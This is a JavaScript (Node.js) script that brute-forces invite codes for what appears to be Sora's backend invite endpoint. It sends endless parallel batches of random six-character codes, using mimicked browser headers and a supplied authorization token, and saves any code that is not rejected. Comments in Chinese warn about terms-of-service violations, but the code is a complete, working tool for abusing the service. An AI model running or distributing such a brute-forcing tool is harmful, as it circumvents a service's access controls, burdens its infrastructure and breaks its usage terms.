const fs = require('fs').promises;
const axios = require('axios');
require('dotenv').config();

/**
 * 注意：该脚本对第三方接口进行大量随机尝试可能违反对方服务条款。
 * 请确认你拥有合法授权并遵守相关使用政策，否则不要运行或自动化此脚本。
 */

const TRIED_FILE = 'tried_codes.json';

// 按 UTC 日期命名当日成功结果文件：success_codes_YYYYMMDD.json
function todayTagUTC() {
  return new Date().toISOString().slice(0, 10).replace(/-/g, '');
}
const SUCCESS_FILE = `success_codes_${todayTagUTC()}.json`;

const BASE_URL = 'https://sora.chatgpt.com/backend/project_y/invite/accept';

// 需要你提供合法的授权头（HTTP_AUTHORIZATION_HEADER）
// 若为空会导致请求失败或被拒绝
const HEADERS = {
  accept: '*/*',
  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
  authorization: process.env.HTTP_AUTHORIZATION_HEADER,
  'content-type': 'application/json',
  'oai-device-id': 'a97f5433-ea90-47b9-8475-af334139ee0b',
  priority: 'u=1, i',
  'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin'
};

const generateRandomCode = () => {
  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars[Math.floor(Math.random() * chars.length)];
  }
  return code;
};

const loadJsonArrayFile = async (file) => {
  try {
    const data = await fs.readFile(file, 'utf8');
    return JSON.parse(data);
  } catch (_) {
    return [];
  }
};

const saveJsonArrayFile = async (file, arr) => {
  await fs.writeFile(file, JSON.stringify(arr, null, 2));
};

const loadTriedCodes = async () => {
  const arr = await loadJsonArrayFile(TRIED_FILE);
  return new Set(arr);
};

const saveTriedCodes = async (triedCodes) => {
  await saveJsonArrayFile(TRIED_FILE, Array.from(triedCodes));
};

const loadSuccessCodes = async () => {
  return await loadJsonArrayFile(SUCCESS_FILE);
};

const appendSuccessCode = async (code) => {
  const list = await loadSuccessCodes();
  if (!list.includes(code)) {
    list.push(code);
    await saveJsonArrayFile(SUCCESS_FILE, list);
  }
};

const delay = (ms) => new Promise(r => setTimeout(r, ms));

const tryInviteCode = async (code) => {
  try {
    const response = await axios.post(
      BASE_URL,
      { invite_code: code },
      { headers: HEADERS, timeout: 30000 }
    );
    return response.status;
  } catch (error) {
    return error.response ? error.response.status : 0;
  }
};

async function ensureFilesExist() {
  // 初始化当日成功文件
  try {
    await fs.access(SUCCESS_FILE);
  } catch (_) {
    await saveJsonArrayFile(SUCCESS_FILE, []);
  }

  // 初始化 tried_codes.json
  try {
    await fs.access(TRIED_FILE);
  } catch (_) {
    await saveJsonArrayFile(TRIED_FILE, []);
  }
}

const main = async () => {
  console.log('Starting process. Today success file:', SUCCESS_FILE);
  await ensureFilesExist();

  let triedCodes = await loadTriedCodes();
  const batchSize = 100;

  // 警告：请确认行为合规。以下循环会持续大量请求。
  while (true) {
    const batch = new Set();
    while (batch.size < batchSize) {
      const code = generateRandomCode();
      if (!triedCodes.has(code) && !batch.has(code)) {
        batch.add(code);
      }
    }

    const batchArray = Array.from(batch);
    let foundSuccess = false;

    await Promise.all(batchArray.map(async (code) => {
      console.log(`Attempting code: ${code}`);
      const status = await tryInviteCode(code);
      if (status !== 403) {
        console.log(`Non-403 status ${status} for code ${code}. Recording to ${SUCCESS_FILE}`);
        await appendSuccessCode(code);
        foundSuccess = true;
      } else {
        triedCodes.add(code);
      }
      // 基本延迟，降低频率；如需更严格速率控制请外层增加节流逻辑
      await delay(100);
    }));

    await saveTriedCodes(triedCodes);

    if (foundSuccess) {
      console.log('Found a non-403 response. Stopping loop.');
      break;
    }
  }

  console.log('Done. Success file path:', SUCCESS_FILE);
};

main().catch(err => {
  console.error('Fatal error:', err);
});
